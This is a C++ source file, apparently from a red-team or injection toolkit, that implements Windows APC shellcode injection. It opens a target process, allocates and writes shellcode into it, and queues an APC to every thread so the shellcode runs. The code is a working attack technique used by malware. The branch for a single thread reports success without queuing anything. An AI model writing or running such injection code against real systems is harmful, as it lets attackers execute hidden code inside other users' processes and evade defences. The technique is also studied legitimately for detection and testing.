#include <cstdio>

#include "sysapi.h"
#include "scripts.h"

namespace scripts {

bool inject_queue_apc(uint32_t pid, uint32_t tid, RemoteProcessMemoryMethod method) {

    wprintf(L"\nOpening the target process\n");
    sysapi::unique_handle ProcessHandle = sysapi::ProcessOpen(pid);
    if (ProcessHandle == NULL) {
        return false;
    }

    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());

    wprintf(L"\nPlacing shellcode in the target process\n");

    RemoteProcessMemoryContext ctx;
    ctx.method = method;
    ctx.ProcessHandle = ProcessHandle.get();
    ctx.Size = (ULONG)default_shellcode_size;

    bool res = process_create_memory(ctx);
    if (!res) {
        return false;
    }

    wprintf(L"  [*] writing shellcode...\n");

    res = process_write_memory(ctx, 0, default_shellcode_data, default_shellcode_size);
    if (!res) {
        return false;
    }

    wprintf(L"\nExecuting shellcode\n");

    wprintf(L"  [*] starting new thread with shellcode start address...\n");

    if (tid) {
        sysapi::unique_handle ThreadHandle = sysapi::ThreadOpen(pid, tid);
        if (ThreadHandle == NULL) {
            return false;
        }

        wprintf(L"\nSuccess\n");
        return true;
    }

    wprintf(L"\nQueueing APT in all threads\n");

    sysapi::unique_handle ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get());
    if (ThreadHandle == NULL) {
        return false;
    }

    do {
        wprintf(L"  [+] thread opened, HANDLE = 0x%p\n", ThreadHandle.get());
        res = sysapi::ApcQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
        if (!res) {
            return false;
        }

        wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", ThreadHandle.get());
        ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get(), ThreadHandle.get());
    } while (ThreadHandle != NULL);

    wprintf(L"\nSuccess\n");
    return true;
}

}